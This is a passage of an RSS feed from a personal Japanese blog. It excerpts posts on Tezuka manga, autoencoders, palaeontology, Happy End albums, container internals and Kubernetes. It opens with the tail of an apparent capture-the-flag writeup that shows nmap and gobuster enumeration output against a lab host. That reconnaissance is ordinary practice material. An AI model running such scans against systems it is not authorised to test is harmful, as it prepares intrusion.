enum nmap PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA) | 256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA) |_ 256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-title: Annoucement |_http-server-header: Apache/2.4.29 (Ubuntu) gobuster /.hta (Status: 403) [Size: 278] /.htpasswd (Status: 403) [Size: 278] /.htaccess (Status: 403) [Size: 278] /index.php (Status: 200) [Size: 218] /server-status (Status: 403) [Size: 278] user.</description>
    </item>
    
    <item>
      <title>見たものログ 2024</title>
      <link>http://side-realms.github.io/log/log_2024/</link>
      <pubDate>Mon, 01 Jan 2024 17:57:25 +0900</pubDate>
      
      <guid>http://side-realms.github.io/log/log_2024/</guid>
      <description>漫画 三つ目がとおる よくある文明風刺 古代遺跡が頻出するのでオープンワールドを探索している気分になる 縄文遺跡を発掘する話が好き ポジティブ先生 ここまで読むとパターン見えてきたよ！って気持ちになる 悪の組織シリーズ好きだから単行本にしてほしい バンパイヤ 「間久部」だし魔女が成功を予言するシーンもあるから多分マクベスだろう 手塚治虫本人が出ていて且つストーリーに深くかかわっているのは意外 ヒゲオヤジが武闘派なのも意外 第一部しか読んでない．第二部は雑誌の都合で打ち切りになってしまったらしい 人間なのにかなり邪悪な思想をもつ間久部とバンパイヤなのにかなり善良な（差別気味ですが）トッペイの対比を描きたかったんだろうと思う マグマ大使 人間モドキをめぐる人間の葛藤が面白かった 人間モドキが人間モドキバレするのに加えて人間が人間モドキと疑われて襲われるシーン 人間モドキが人間と絆を繋げてしまうシーン ゴア弱すぎない？ 最後の方のやっつけ感が残念だけどこの時期はかなりオーバーワーク気味だったらしい 海のトリトン ポセイドン貯蔵庫みたいなのマジでキモすぎて笑った ピピ子かわいすぎる，新しい扉が開くところだった ガノモスと自爆エンドですべてを台無しにしている ザ・クレーター マジでおもしろい．この時期に「手塚は終わった」って言われてたらしいけどこの時代にこのレベルの作品を描けた人何人いるんですか？？ 風穴 ？？？ 鈴が鳴った 音と記憶がトラウマとして結びついた結果．．．みたいな ラストの皮肉っぽい感じ，咀嚼しきれない クレーターの男 戦争アカンな（薄） 数百年も地球への帰還を求めていたのに地球の惨状を知って月での暮らしの方を選んでしまう 核の光怖すぎ 煙で永遠に生きられるけど正気でいられるのか，みたいな怖さと死ぬときはほぼ自殺になってしまう怖さがある 全部面白いけど書ききれない 七色いんこ かなりおもしろい ほとんど短編集の体をしていて娯楽作品だが大筋のストーリーが相当いい 絵もいい．いんこがただ冷静なキャラに収まっていないのが余裕を感じる いんこの正体，女刑事との関係，みたいなのは手塚治虫もこういうの描くのか．．．みたいな気持ちになる 「日本の国土！！」が思想強すぎて笑った アポロの歌 女神像のシーンがうますぎる．劇画とはこのこと 近石昭吾の転生は，毎回愛を知った瞬間にどちらかが死ぬことで幕を閉じる 最後の描写的に一生転生するからかなり怖い かなり最後の方にアポロが出てくるが，ここまで考えているなら本当に怖い 合成人間の話がかなりつらい 合成人間と区別するための，人間としての尊厳を考えたときに愛情が必要だと手塚治虫は描いている 一方で合成人間である女王は途中から愛情を覚えている（ように見える） そうするとこの世界で区分される人間と合成人間の違いは組成的な違いしかないように見える 昭吾の暗殺仲間は愛情を知らない（ないがしろにする）人間の表現なのかな？ きりひと讃歌と同時に連載していたらしい．異常 人間ども集まれ 絵柄がこれまでとは全然違って力が抜けている これが悪いわけではなくてむしろテーマに寄り添っていて好みではある ただ手塚治虫に求める（何様）絵柄はこれではないという感じ こういう作品を見るたびに思うけど話の広げ方がうまい時期とめちゃくちゃな時期がある エロ要素がふんだんに盛り込まれているんだけどどれもが迫真すぎてエロくない 性癖目的のエロと迫真のエロが切り分かれてる気がする．考えすぎかも というかこの絵柄だから耐えてるだけで普通にどろろとかの絵柄でやったら事故ると思う 第三の性が今でいうLGBTQみたいな話かどうかは分からない 戦争はダメなのはそれはそうなんだが第三の性を使って戦争をエンタメにするのがよくないという倫理観と闘牛は許せる，みたいな倫理観の境界どこにあるのか エンタメとしての戦争（最悪）とか，第三の性みたいなのを目で見たことないから（それはそうなんだが）よく分からない 人間の体をしていたら倫理観が発動するのか，じゃあハンディキャップとか犯罪者はどうなるんだ，みたいな 犯罪者とハンディキャップを同じくくりとしてみているわけではない 反逆系は手塚治虫のパターン（メトロポリスとかバンパイヤとか）だけどこの作品は反逆側も人間なだけに重い かなりデフォルメが効いててそれが逆にしんどい（銃殺がただの穴あきで表現されるとか） メトロポリス 旧版をよんだので読みずらかった よくある反逆系 子供向けだからか結末付近が「こういうのでいいんだよ」って感じでよかった．こういうのでいいんだよ ミッドナイト すばらしいと思う，手塚治虫の短編能力はマジで目を見張るものがある しかもただの短編というわけではなく，七色いんこのように大筋のストーリがあってその中で短編，たまに中編が混じるという感じ 珍しく小さい女の子が頻出する．かわいい ここまで単純な正義を貫いた作品も珍しいと思いつつ，ホラー，SF，人情などただの勧善懲悪で終わらせない創作能力の高さも同時に感じる カササギ運輸・クリプトムネジア・花火師の話が好き 特に花火師は良い 対決で終わりかと思ったらその奥にもう一つエンドがある ブラックジャックとか三つ目とかがクロスオーバー的に出てきて胸アツ ラストが衝撃すぎたが性別をテーマにする手塚治虫らしいといえばらしいか．．． 「どんでん返し」はこれくらいやってから言ってほしい ばるぼら 相当おもしろかった 芸術と人間関係，みたいな話 このころの手塚は相当落ち込んでいたらしく，アニメも上手くいかず，会社も倒産，少年誌もバズらず，みたいな感じだったらしい 前半は短編形式で若干のコメディを交えながら話が進むが，後半からばるぼらの正体は何か，みたいなところに迫っていく 手塚治虫の根底には「マンガを大人の文化（芸術）にする」みたいな意思があったはずで，その影響なのか後半は芸術観に迫った話が多いように思う ばるぼらが魔女である，みたいなところまでは良くて，一方で魔女と芸術がどういう関係にあるかはまだ理解できない 宗教的観念なのか？ 最後はほぼ神vs人間みたいな構図になっている 死の淵で創作した作品は理性を保つためなのか，それとも単純に心身を削って完成した賜物なのか 名声に対する意識も気になる 美倉は最後の作品がバズっても世間に姿を現さず，「死んだ」という体で浮浪している これまでの美倉（特に結婚後）は名声に意識があった 手塚治虫自身に対する戒め的な表現なのか？とか思ったがよく分からない ファウスト ファウストと百物語が入っているがどっちもファウスト準拠 百物語の方がさすがに洗練されていて面白い ファウストは古典をそのままなぞっただけ感があるが，百物語はちゃんと自分の物語になっている 名前のモジり スダマさすがに可愛すぎる マジでケモナーになってしまった メタモルフォーゼも同時に発症してしまって救いようがない このころスランプの時期だったらしい． サスピション あまり面白くなかった というか結末が思ったより単純 ハードルが高すぎる感は否めない こじき姫さすがに性癖出すぎ 後期の作品だけあって絵柄は綺麗 ガラス城の記録 かなり面白かった 終わり方が．．．あんまりにも．．． 来るべき世界 安直な文明漫画といえばそうかも 世界が滅亡することが一番の平和というのはそうかもなあという気持ちになる 火星博士 この時期のアクションは可愛げがあっておもしろい 大空魔王 拳銃天使 最後のコマですべてひっくり返ってて笑った 仮面の冒険児 上を下へのジレッタ VR を先取りした漫画だと思う．さすがに先見の明すぎる 最後世界の終焉を迎えるのは特に意味がないと思っている ジレッタが出てくるのが意外と遅いが，これは逆説的に書き始めの時点からプロットがしっかり引かれていることの証拠だと思う． ヒロインの変身具合がすごい 実写でやったら多分冷めるだろうな，ぐらいの勢い 多分映画とかアニメに対するライバル心・熱意があって漫画表現の最上を狙ったんだと思うが考えすぎかもしれない 38 度線の怪物 火星から来た男 化石人間 38 度線は朝鮮のことかと思ったけどそうではないんだな SF ミックス 短編集が入っている ランダムに入っていて，SF ミックスという名前で出版をしているわけではない？ 時計仕掛けのりんご 全部の短編がクオリティ高くて面白い ペーターキュルテンの記録 連続殺人犯のノンフィクション ふるまいは完全にサイコパスなんだが途中途中に挟まる人間への愛情が変なコントラストになっていて怖い 時計仕掛けのりんご いい SF でもこれ仮に市内でうまくいっても全国に拡散するのは難しいんじゃないか カノン 戦争系の描写つらすぎる 仮に小さいころ失くした友達に会えるってなっても余計に悲しくなるから会いたくないよな 白い幻影 これ手塚治虫の短編の中で一番好き 妻側の誠意と不憫さが後味最悪 でも夫側も記憶喪失なだけで誠意が無いわけではない 妻側がもう後戻りできない年齢になっているのも悲しい 最上殿始末 間男が実は元殿だった説を推す MW すさまじい Man, Women という意味で MW らしい 雰囲気はアドルフに告ぐに似ているが，こっちの方がフィクションっぽい 政治悪，同性愛，異常性癖，猟奇殺人みたいなありとあらゆる闇がてんこもり 一方でそれぞれが十分な情報量をもっていないので中途半端ともとれてしまう 警察と神父のやりとりは面白かった．実際に懺悔はどう扱われるんだろう 後味の悪さ，というか勇気ある行動も報われず悪が買ってしまう結末は CUE とか SEVEN に似てる 映画もあるらしいけどキャッチコピーが終わってて悲しい 結城の性癖どうなってんや 賀来の葛藤が醍醐味だと思う．神父という立場でありながら同性愛，かつ犯罪を見過ごす立場にいることの矛盾，みたいな 同性愛のスクープの解決方法はおもしろかった 陽だまりの樹 火の鳥 小さいころ読んだけど覚えてないし改めて読んで感想を残そうという試み 黎明編 ラストのコママジで良い モノクロなのにここまで広い世界描けるのすげ～ 未来編 クライマックスすぎる 世界絶滅後の景色の移り変わりの描き方が映画かと思った 2001年宇宙の旅を感じる マサトが絶対的な存在になった後の展開は目を見張るものがある 単純に人間になるだけでなくナメクジ人間みたいなのが登場することで，今自分たちが知ってる古生物以前にもっと深い歴史があったように思える 序盤の戦争勃発みたいな話をこの時代に想像できていたのマジで手塚治虫すぎる 大和編 殉死の尊さと命の尊さが逆転したのってどれくらいの時期なんだろう 宇宙編 流刑星の救われなさ こういう強烈な環境と「なれの果て」みたいなのを描くのうますぎるな 火の鳥はフレミルの民族ってことなのか？ でも牧村がフレミルを虐殺しているときにフレミルはちゃんと死んでいるから永遠の命をもっているのはコンタクトをとってきたフレミルだけなんだよな 一方でフレミルが以前人間の姿で登場したときはこの容姿だったように思える 顔が醜くなったのは黎明編の猿田彦に似てるな 鳳凰編 復活編・羽衣編 望郷編 乱世編 生命編 異形編 太陽編 ゴッドファーザーの息子 ゴッドファーザーの息子 全くタイプの違う友人ができることはよくある バンカラが特攻で死んでしまうのはしんみりする 紙の砦 終戦した喜びと，残り続ける戦争の禍根がまざまざと描かれている 大寒の彼女がオペラ歌手の夢を断念せざるを得なくなる悲しさ ノーマン 月のクレーターが実は戦争の遺恨だったという設定 異星人の設定を考えるのがいつもうまい マグマ大使とか海のトリトンは「え？」みたいな話の進み方が多かったけど今回はある程度納得する進み方でよかった 総員玉砕せよ 人間はシンプルに描かれているのに対して背景が異常に丁寧に描かれていてリアリティがある 息がある仲間の小指を切り落として持ち帰るシーンとかも，雨に打たれながら異国で不本意に死んでいくナンセンスさを感じる 上官の意思とかエゴでで人間が死ぬのは救われないのはそうだけれど「戦争だというのにリクツばかりいうな」みたいなセリフは感じるものがある 劇画ヒットラー 史実としては信用してないし，若干読みづらい 行間を文字で埋めているのでしょうがない ヒトラーがどうして民主主義を守りながら独裁政権を確立したのか？ ヒトラーが「全権委任法」を成立させたから しかし，これは当作品にもあるように，ほとんど脅迫のような雰囲気で成立した． ヒトラーに反対するような共産党議員，社会民主党議員は既に逮捕されていたため，投票の場にすら出席できなかった． この全権委任法によってヒトラーはほとんど自由に法律を作ることができるようになった(ここは理解が怪しい) これにより国会は形骸化，議会制民主主義が消え，実質的にワイマール憲法が廃止したことになる ヒトラーの周囲には貧困が蔓延っている 一方で，ヒトラーのように「自分が不幸だから周囲も不幸であるべき」と思うかどうかはその人の精神によるものだと思う 選挙行こうと思った ビッグX 飽きたのがアリアリと伝わる 雨ふり小僧 雨ふり小僧 確か後期の作品 絵柄が安定していてめちゃくちゃカワイイ 最後まで待つ雨ふり小僧けなげすぎるだろ るんは風の中 カラッとしつつも湿度高めのSF こういうのいいよな 現代マンガ選集(異形編) ポーチで少女が小犬と 萩尾望都の SF を初めて読んだ あっさりしていて面白い 「COM」に掲載されていたらしい 火の鳥のページ埋めに掲載したらしいけど埋めどころか主役級だと思う アカプルコ・ゴールド 吉田秋生の絵は良い 新しいものに飛び付くのはやめられない．．． サイボーグ 水木しげるにしてはあっさりしてるように思う ぼくとフリオと校庭で マジでいい フリオどこいっちゃったんだよ．．． ナンバー7 イラストが安定し始めたような気がする 最後飽きすぎだろ 百物語 ロロの旅路 悲しすぎる 犬とかオオカミを描かせるとマジでかわいいな 荒野の七ひき これは面白い 架空の宇宙人の特性とかめちゃくちゃアイデア湧いてくるんだろうな 安達が原 アンニー&amp;hellip; 「アンニー!</description>
    </item>
    
    <item>
      <title>見たものログ 2024</title>
      <link>http://side-realms.github.io/log_2024/</link>
      <pubDate>Mon, 01 Jan 2024 17:57:25 +0900</pubDate>
      
      <guid>http://side-realms.github.io/log_2024/</guid>
      <description>aaa</description>
    </item>
    
    <item>
      <title>音楽生成2</title>
      <link>http://side-realms.github.io/sound/ml3/</link>
      <pubDate>Sun, 03 Dec 2023 13:41:49 +0900</pubDate>
      
      <guid>http://side-realms.github.io/sound/ml3/</guid>
      <description>名誉伝説のドラム上手くないですか？
導入 前回の音楽生成の続き
この本の目次を読んで自分で実装してみる
オートエンコーダによるメロディ圧縮 多分オートエンコーダを使った次元圧縮のことを言っているんだと思う． メロディ圧縮は調べてもよく分からんので(多分メロディ情報の圧縮のことだと思うが)単純にオートエンコーダをいじってみる
とりあえずここを見てみる
オートエンコーダは，入力と出力が同一になるように学習することで 入力の次元圧縮器を生成する NN の一つ． 中間層が入力層よりも次元が小さくなっている．
次元圧縮：直感的な使い方で，入力したデータをデコーダで再現できるレベルで中間層に圧縮することで次元を削減できる 異常検知：正常な入力だけで NN を学習すれば，異常な入力をしたときに出力側で再現できなくなるので，異常検知に使うことができる． 実装 チュートリアルをなぞるだけだけどやってみる
import matplotlib.pyplot as plt import numpy as np import pandas as pd import tensorflow as tf from sklearn.metrics import accuracy_score, precision_score, recall_score from sklearn.model_selection import train_test_split from tensorflow.keras import layers, losses from tensorflow.keras.datasets import fashion_mnist from tensorflow.keras.models import Model (x_train, _), (x_test, _) = fashion_mnist.load_data() x_train = x_train.astype(&amp;#39;float32&amp;#39;) / 255. x_test = x_test.</description>
    </item>
    
    <item>
      <title>音楽生成</title>
      <link>http://side-realms.github.io/sound/ml2/</link>
      <pubDate>Sat, 02 Dec 2023 17:57:25 +0900</pubDate>
      
      <guid>http://side-realms.github.io/sound/ml2/</guid>
      <description>中華ホラーにハマってる
たまにシャレにならない怖さのものがあって興奮する
導入 いい本があった
おもしろそうなので目次だけ見てコンテンツを自分で実装してみる．
機械学習入門 まずは概観する． ここは先の書籍とは関係ない．
単純パーセプトロン $y=f(wx+b)$ があって，$w$ が重み，$x$ が入力，$b$ がしきい値
入力 $x$ が複数次元存在し，これが重み $w$ を持って加算される． この結果 $y$ がしきい値を超えれば発火するし，超えなければ発火しない．
$f$ の活性化関数は，例えばステップ関数なら 0, 1 を出力する． でも二値しかなくて不便なのでロジスティック関数を使うこともある． 0, 1 の二値ではなくて，0, 1 の確率を出力する． 確率が 0.5 を超えれば 1 みたいなイメージ
で，これは結果出力の話で，機械学習というからには学習をする必要がある． 例えば一回目で $y_1 = f(wx+b)$ という結果が得られたとする． このとき正しい答えは $t$ であるとする． 出力が大きいときは，入力に対して小さくなるように重みを訂正する必要があるので，例えば以下のようにする $$w&amp;rsquo; = w - (y-t)x$$ 例えば出力が大きいときは $y-t &amp;gt; 0$ となるので， $w-(y-t) &amp;lt; w$ であるから， $w&amp;rsquo;$ は小さくなる． 逆に出力が小さいときは $y-t &amp;lt; 0$ となるので， $w-(y-t) &amp;gt; w$ であるから， $w&amp;rsquo;$ は大きくなる． バイアス $b$ も同じように調整される．</description>
    </item>
    
    <item>
      <title>古生物1</title>
      <link>http://side-realms.github.io/archeology/palaeontology1/</link>
      <pubDate>Mon, 20 Nov 2023 17:57:25 +0900</pubDate>
      
      <guid>http://side-realms.github.io/archeology/palaeontology1/</guid>
      <description>最近モンストが楽しすぎて生活が終わってる．けいウサでランクが 600 -&amp;gt; 850 になりました
時代区分 大きく区分すると先カンブリア時代と顕生累代に分類される． 先カンブリア時代はバクテリアなど目に見えないような小さい生き物がいる一方， 顕生累代は目に見えるような大きい生物が繁栄した．
その中で特に顕生累代は古生代，中生代，新生代に分類される． 古生代は三葉虫やウミユリ，中生代は三葉虫など，新生代はそれ以降の哺乳類などがあらわれる．
先カンブリア時代 地球が誕生したのは約 46 億年前で，その後冥王代がやってくる(46 億年前 ～ 40 億年前)． このころは地殻すらなく，「残る」「残らない」のスケールではない． この次は太古代(始生代)がくる．冥王代と含んでアーキアンと呼ばれることもある． このころから地殻ができ，細菌やバクテリアが出現する． シアノバクテリアとかストロマトライトとかはこの時代に対応する． この次に原生代がくる．プロテロゾイックとも呼ばれる． ホロディスキア(数珠みたいなのがつながったやつ)とかはこの時代． バクテリアより大きな化石のうち，最も古いものもこの時代に見つかっている（グリパニア） このあといくつかの氷河期を経験してエディアカラ紀に突入する．
エディアカラ紀 このころの化石は体が直接残っているわけではなく，印象化石と呼ばれる， 体の跡や動いた跡の化石が残っている． このころの生物（エディアカラ生物群）は体節をもっていることから，原始的な節足動物だと考えられている． 一方で，現在の生物とは全く関係ないという主張もある． また，この時代の生物に肉食動物はいなかったと考えられている． この理由はまず「藻」（バクテリアマット）が削られた跡があること， さらに「硬い殻」をもつ生物が少なかったことが挙げられる． しかし，後半になると「硬い殻」をもつ生物が増え，肉食動物が出現し始めていることが分かる．
カンブリア紀 この時期の化石は鉱物質の物が多い． これと関連して三葉虫の化石がかなり多い． 三葉虫はエディアカラの化石などと比較してかなり発達しているため， これまでの進化論で考えてもこの時期に三葉虫が出現するのは突然すぎると疑問が残っていた． それもそのはずで，三葉虫とエディアカラの間に存在していた動物が残っていなかったため， 当時の資料だけだと三葉虫が突然現れたように見えてしまう． 三葉虫以前の生き物は比較的柔らかかったため，化石として残るには特別な条件が必要になるが， この特別な条件が揃ったのがあのバージェス頁岩． 頁岩は泥が圧縮されてできる層なので，酸素が薄く，生きものはまともに住めない． こうした層に急速に固められた柔らかい生き物がバクテリアさえいない環境で残って， 運よく化石になったということらしい．
オルドビス紀 この時期はシルル紀とカンブリア紀の重なりを指す． またこの時期から全盛が始まる筆石が出現する． カンブリア紀か～石炭紀まで生息しており，紀ごとに形態が異なるため，示準化石として知られている． あと特筆すべきは大量絶滅があったことだと思います． 顕生累代では計5回大量絶滅があったが，そのうち最初にあったものがこれ． 急激な氷河期と温室効果の連続で多くの種が絶滅してしまった．
シルル紀 オルドビス紀の大量絶滅から生きものは意外と早く回復した． 三葉虫や筆石も発生したが様子が変わっており，またウミサソリがこの時期に台頭した． ウミサソリは三葉虫よりも柔らかい殻をもっているため，意外と残っていないらしい． また，この時期に新しく台頭した生き物にサンゴと魚，陸上植物がある． 魚はこのころはまだ顎がない．
デボン紀 この時期からアンモナイトが栄え始める． また魚と陸上植物（特に樹木）が栄え始める． これまで時代を制覇していたのはウミサソリだったが，デボン紀からは 魚が顎を持ち始め，特にダンクルオステウスという全長 6~7 m ほどの魚が制覇するようになる． 一方で大量絶滅が 3 回も起きた時代でもある． 陸上植物の大量発生に合わせて二酸化炭素濃度が急激に上がったためとか言われてるらしい．</description>
    </item>
    
    <item>
      <title>HAPPY END</title>
      <link>http://side-realms.github.io/sound/happyend/</link>
      <pubDate>Wed, 08 Nov 2023 08:39:04 +0900</pubDate>
      
      <guid>http://side-realms.github.io/sound/happyend/</guid>
      <description>はっぴいえんどのラストアルバム． 解散が決まってからロサンゼルスで収録された作品で，その影響かこれまでのアルバムと比較して西海岸のカラッとした印象をうける． 松本は解散に賛成していなかったらしく，今回のアルバムでは鈴木茂以外に歌詞を提供することを断ったという． そうとうギクシャクしているはずだし，本アルバムのアートワークも本来は4人の写真を撮るはずだったがそれすらできないほど精神状態が安定していなかったという． かと言ってクオリティが低いわけではなく，素敵で聞きやすい曲が多い． でも当時の写真とか見てもそんなに仲悪そうな感じはしないけどどうだったんだろうな．
松本が歌詞を提供しなかったのは必ずしも悪いことだけではなくて， 細野の相合傘とか大瀧の田舎道とかこれからの彼らのソロワークの布石みたいになっているような気もする（大瀧はこの時点ですでにソロデビューしていたが．．．）
あとやっぱり特筆すべきは鈴木の作品が多いことだと思う． 前作では一曲しか提供していなかった鈴木が今回は3曲も提供している．
はっぴいえんどが続いてたらどうなってたんだろうな
1. 風来坊 作詞作曲は細野晴臣
風来坊はどこからともなくあらわれて去っていく人のこと(wikipedia)． 松本の歌詞と区別するために言葉遊びを多めにしたらしい．．．
バックのホルンがゆったりしていて印象的な一方，イントロのベース入りがすごくかっこいい
2. 氷雨月のスケッチ 作詞は松本隆，作曲は鈴木茂
これ，めちゃくちゃ好きです． サビだけ大瀧が歌っていてなぜそこを譲ってしまったのか．．．といつも思う． 小坂忠もカバーしてるね
風来坊で漂っていたふわふわして暖かい空気がイントロのギターで一気に冷たくなる． 冷たい雨と街の情景を濁ったギターが構成してくれるように思う
雨のむこうに街が煙って
イントロの雰囲気も相まってここはモノクロな風景が想起される．
赤や黄のパラソル涙に濡れて 12色の色鉛筆でスケッチされたお前の顔
全然カラフルな感じになってきた
赤や黄のパラソルってなんだ？って感じだが車のランプとか店の明かりとかじゃないかな
そういう明かりが顔に当たってるねっていうことだと思ってる． 全然違うかも
ねえ もうやめようよ こんな淋しい話
別れ話だったんですかね
3. 明日あたりはきっと春 作詞は松本隆，作曲は鈴木茂
これ，最高です
めちゃめちゃカラッとしてて風街ろまんとのギャップを感じる． 「春よ来い」とか言ってた時期とは全く違う雰囲気があります． ラララララ～～～～
最初聴いたとき大瀧が バカラックの Alfie の盗作じゃないかと喧嘩をふっかけたらしい． 演奏中も奏者に「Alfie に似てない？」って聞いたらしい． その喧嘩を細野は「茂はジミヘンしか聴いてないからバカラックなんか知らないよ」って言って止めたらしい． 大瀧も細野も友達にはなりたくない
4. 無風状態 作詞作曲は細野晴臣
HOSONO HOUSE に通じるものを感じる． 細野のベースが常に動いていてリズムとメロディーを同時に担当しているようにみえる． 特にドラムやアコギに動きが少なく，後ろに引っ込んでいることも影響していると思う．
歌詞は a solty dog からの引用らしい
無風状態はまあおそらく風がない状態の船のことを指していて， この時期のはっぴいえんどは全員でどこかに向かう，みたいな方向性ではなくて 一人一人が自分の音楽に向き合っていたという状況を見ているんだと思う． 壮大な音楽の大海にこの船で立ち向かえるのかという不安
船を降りる</description>
    </item>
    
    <item>
      <title>風街ろまん</title>
      <link>http://side-realms.github.io/sound/happyend1/</link>
      <pubDate>Fri, 22 Sep 2023 22:57:54 +0900</pubDate>
      
      <guid>http://side-realms.github.io/sound/happyend1/</guid>
      <description>風街ろまんの感想をいまさら文章にしてみる
1. 抱きしめたい 作曲は大瀧詠一，作詞は松本隆で，ギターソロは鈴木茂． 颱風とはいから・びゅーちふる以外は松本が作詞を担当している．
主人公が「君」に会いに汽車に乗って出かける話． 「君」が恋人なのか宮沢賢治なのか（松本隆は宮沢賢治に作詞の影響をうけているが， それが最もあらわれているのがこの「抱きしめたい」だと語っていた）は分からないけど 誰かに会いに行っている．
「黝い」とか「曠地」とか「驛」とか漢字のこだわりが強い
ゴオゴオゴオと 雪の銀河をぼくは まっしぐらなんです
ここの浮遊感がとてもいい． 雪が吹雪いているような印象を受けるイコライジングとパン振りが印象深い．
とても素早く 飛び降りるので きみを燃やしてしまうかもしれません
は？ という感じだが「きみ」へのアツい思いを感じるだけではなく 自分だけが先走っているような，「きみ」はそれほどアツい思いはないんじゃないか， というような印象をうける．
アウトロは以下
シュッシュッシュッ (ぽっぽぽーおお)
これは汽車の音もあるしビートルズの come together の shoot のオマージュでもあるらしい． へぇ～
2. 空色のクレヨン 作曲は大瀧詠一
のんびりした三拍子の曲．
空色のくれよんできみを描いたんです そっぽを向いた真昼の遊園地で
良い情景に思える．現実的には奇行だが．．．
「空色のくれよん」で描く女の子の情景をなんとなくイメージしてしまうのは松本の詞のせい
ぼくは きっと風邪をひいてるんです
「きみ」に照れているようすを比喩した表現． マジでいい詞だと思う．いつか言いたいことばランキング第3位です．
ソララロィ～ イロロロホォ～ アラララアァ～
ヨーデルだなあ
平穏な曲ではないと思うけど間抜けなヨーデルが急にかわいい
きみの眸（ひとみ）のなかで雲が急に雪崩れると
「きみ」が泣いたんだろうか
だから絵描きすぎなんだって
透き徹った冬に帰ってしまうんです
は？という感じだが1曲目の「抱きしめたい」を引用しているのかな？
だとすると1曲目の「きみ」は恋人なんだろうか
3. 風あつめて 作曲は細野晴臣
声と歌い方が良い． なくなっていく風景が悲しいね，っていう歌なんだから朴訥に，素朴に歌っているのがいい．
風をあつめてが作られたのは 1970 年ごろで，1964 年の東京オリンピックの影響を受けている． オリンピックに伴う都市開発で見慣れた風景が消えてしまって悲しいね，という曲． 一方で「絶望」とか「孤独」みたいなおおげさな雰囲気はあんまり感じられなくて， 「なんとなく不安」みたいな漠然とした負の感情の方が似合っていると思う． 永久に変わらないものは無いので都市開発そのものを批判することはできないけど そのときの感情とか情景をこうやって残しておくのは素敵なことだと思う(誰？).
街のはずれの</description>
    </item>
    
    <item>
      <title>自作コンテナ1</title>
      <link>http://side-realms.github.io/container/own/</link>
      <pubDate>Wed, 13 Sep 2023 18:40:52 +0900</pubDate>
      
      <guid>http://side-realms.github.io/container/own/</guid>
      <description>缶コーヒー，飲めたことない
自作コンテナ 簡単に復習だけ
namespace カーネルのリソースを隔離するためのしくみ
PID: PID は新しいプロセスができるたびにインクリメントされた整数がプロセスの識別子として付与される． コンテナの中では独立した PID を見せたいが，同じ PID をもったプロセスが複数できると不便． MNT: マウントポイントに関するリソースの隔離．他の namespace に影響を与えることなくマウント，案マウントをすることができる NET: プロセスのネットワークスタックを分離する．メインのネットワーク namespace の他に仮想イーサネットペアを作り，namespace 上に仮想リンクを作る UTS: UTS namespace でホスト名とドメイン名を分離する． IPC: IPC に関するリソースを分離する．POSIX メッセージキュー USER: namespace ごとに UID/GID をマッピングすることができる．プロセスは，namespace の外では 0 以外の UID を持つ一方で，namespace では UID を 0 として持つことができ，root のように振舞うことができる． CGroup システムリソースを使うプロセスをグループ化して，それぞれのグループで リソースの使用量をコントロールできる．
Layer filesystem namespace と cgroup はコンテナがもつシステムの分離とリソース共有 の役割を果たすが，レイヤー layered filesystems は マシンイメージ全体を効率的に移動することができる． コンテナの rootfs はレイヤ構造で管理されている． イメージは特定のファイルシステムに依存しない形で定義されていて，簡単に移植できる．
骨組み func main() { switch os.Args[1] { case &amp;#34;run&amp;#34;: // 引数に run をとると execute を実行できる execute(os.</description>
    </item>
    
    <item>
      <title>kubernetes</title>
      <link>http://side-realms.github.io/container/kubernetes/</link>
      <pubDate>Sun, 03 Sep 2023 14:14:38 +0900</pubDate>
      
      <guid>http://side-realms.github.io/container/kubernetes/</guid>
      <description>kubernetes コンテナを管理，スケールさせるためのツール（コンテナオーケストレーションツール） https://kubernetes.io/docs/concepts/overview/#why-you-need-kubernetes-and-what-can-it-do
kubernetes では負荷分散やストレージオーケストレーション，セキュリティなどが機能としてある． 基本的に kubectl で kubernetes クラスタを操作する．
https://www.cncf.io/wp-content/uploads/2020/09/Kubernetes-architecture-diagram-1-1-1024x698.png
Contorol Plane は Node(Pod が実行されるマシンで，コンテナをまとめた単位)を制御する
Control Panel API server: kubernetes クラスタを操作するための REST interface を提供する．Pod やサービスに対する操作はエンドポイントでプログラムされている Scheduler: リソース容量を監視して，Node のパフォーマンスが最適になるように管理する Controller manager: Node がダウンしたなどのイベントに対して宣言との差異を確認する kubelet: コンテナが実行されていることを確認するために pod の状態を追跡する kube proxy: サービスから Node に流入するトラフィックを管理する etcd: クラスタの状態を保存する Component Pod: コンテナをまとめるグループで，kubernetes の最小単位．Pod には IP アドレスが割り当てられていて，同じコンテナの Pod は同じリソース（メモリなど）を共有する． Deployment: Node 上で動く Pod の管理をする．希望する数の Pod を常に動かしておくなど Servise: 個々の Pod において，IP アドレスなど多くのものが生え変わりのたびに変化するので，このアドレスのルーティングなどを行う．Pods はユニークな存在ではないので，ダウンタイムを少なくする工夫が必要 Ingress: 負荷分散．クラスタ外から来る通信をロードバランサによって制御する．制御されたトラフィックを service にルーティングする． やってみる とりあえず windwos に minikube をインストールする． 今回は virtualbox を使う</description>
    </item>
    
    <item>
      <title>クラウドネイティブ</title>
      <link>http://side-realms.github.io/container/cncf/</link>
      <pubDate>Sat, 02 Sep 2023 15:42:29 +0900</pubDate>
      
      <guid>http://side-realms.github.io/container/cncf/</guid>
      <description>高尾山でビールが飲みたい
クラウドネイティブ クラウドネイティブという言葉を初めて聞いたので少しだけ調べる
VM ではなく，高密度で構成できるコンテナを基本にする． これにより，高速なスケーリングであったり，高速なデプロイが可能になる
マイクロサービス システムを細かいサービスに分解し，そのそれぞれを連携させることでシステムを機能させる．局所的案機能追加・修正などが可能 サービスメッシュ 細かいサービスを管理するのがコンテナで，このコンテナ間の通信などを管理する 宣言型 API コンテナ間の通信は API を介して行われるが，この API の定義を宣言すれば使えるようになる（生成される？）ような API イミュータブルインフラストラクチャ インフラの更新をコンテナに影響せず行うことができる マイクロサービス システムを細かいサービスに分解し，それぞれで連携させることでシステムを機能させる
サービスごとにチームが存在するので，チームそれぞれで自律的に開発・運用ができる
仕様の自由度が高い
スケーリングがしやすい
サービスが大きくなると attack surface が増える
アクセス制御・通信保護の負担が大きくなる
サービス個々が頻繁に変化するので依存は危険
